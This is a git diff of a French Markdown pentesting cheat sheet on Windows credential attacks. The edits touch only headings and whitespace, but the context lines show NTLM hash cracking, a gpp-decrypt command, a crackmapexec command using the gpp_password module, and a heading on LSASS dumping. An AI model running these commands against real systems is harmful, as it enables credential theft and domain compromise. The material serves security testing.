@@ -1,8 +1,8 @@
 # Attaques Windows avec identifiants
 
-## 1. Obtention d'identifiants / hash NTLM
+## 1. Obtention d'identifiants / hash NTLM
 
-### 1.1. Cracking
+### 1.1. Cracking
 
 > Prérequis : Hash Net-NTLMv2 obtenu au préalable
 >
@@ -33,8 +33,6 @@ $ gpp-decrypt <HASHED_PASSWORD>
 # Ou plus facile, utilisation du module gpp_password CME
 $ crackmapexec smb <IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M gpp_password
 ```
-
-
 
 ### 1.3 Dump LSASS
 
